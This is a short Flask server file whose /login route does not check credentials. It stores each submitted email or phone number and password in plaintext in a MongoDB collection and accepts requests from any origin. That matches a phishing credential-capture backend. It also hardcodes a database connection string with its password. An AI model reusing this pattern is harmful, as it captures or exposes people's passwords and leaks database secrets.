import os
from flask import Flask, request, jsonify
from flask_cors import CORS
from pymongo import MongoClient
from datetime import datetime, timezone

app = Flask(__name__)
CORS(app)

# Connect to MongoDB Atlas
def connect_to_mongodb():
    connection_string = "mongodb+srv://khebbabmohamed5:chanpanzi@summer.wkal298.mongodb.net/?retryWrites=true&w=majority&appName=summer"
    client = MongoClient(connection_string)
    print("✅ Connected to MongoDB Atlas")
    return client["summer"]

db = connect_to_mongodb()
users_collection = db["User"]

# Handle form submission (POST)
@app.route("/login", methods=["POST"])
def login():
    try:
        data = request.get_json()
    except Exception:
        return jsonify({"success": False, "message": "Invalid JSON data"}), 400

    email_or_phone = data.get("email_or_phone")
    password = data.get("password")

    if not email_or_phone or not password:
        return jsonify({"success": False, "message": "Both fields are required"}), 400

    user_doc = {
        "email_or_phone": email_or_phone,
        "password": password,
        "created_at": datetime.now(timezone.utc)
    }

    try:
        users_collection.insert_one(user_doc)
        return jsonify({"success": True, "message": "User inserted into database."})
    except Exception as e:
        return jsonify({"success": False, "message": f"Database error: {str(e)}"}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))  # Use the provided PORT environment variable
    app.run(debug=False, host="0.0.0.0", port=port)  # Run the app on the dynamic port
